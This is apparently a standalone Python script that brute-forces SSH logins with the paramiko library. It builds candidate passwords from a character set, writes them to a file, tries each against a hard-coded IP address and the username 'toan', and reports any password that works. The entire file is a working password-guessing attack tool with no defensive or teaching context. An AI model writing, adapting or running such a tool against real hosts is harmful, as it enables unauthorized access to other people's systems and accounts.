import itertools, paramiko, sys, os, socket
hostname= '100.76.96.22'
username = 'toan'
port = 22
password = ''
input_file = open("example.txt", 'a')
chrs = 'abcstuvnzxmbcmy1234567890'
n = 1
for xs in itertools.product(chrs, repeat=n):
    password = ''.join(xs)
    input_file.write(password + "\n")
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(hostname = hostname, port = port, password= password, username= username)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code =2
    ssh.close()
    return code
input_file = open("example.txt")
print("")
for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)
        if response == 0:
            print("Password Found: {}, {}, {}".format(i.strip(), username, password))
            sys.exit(0)
        elif response == 1:
            print("Password Incorrect: {}, {}".format(username, password))
        elif response == 2:
            print("Connection Failed: {}".format(hostname))
            sys.exit(2)
    except Exception as e:
        print(e)
        pass
open("example.txt", 'w').close()
input_file.close()
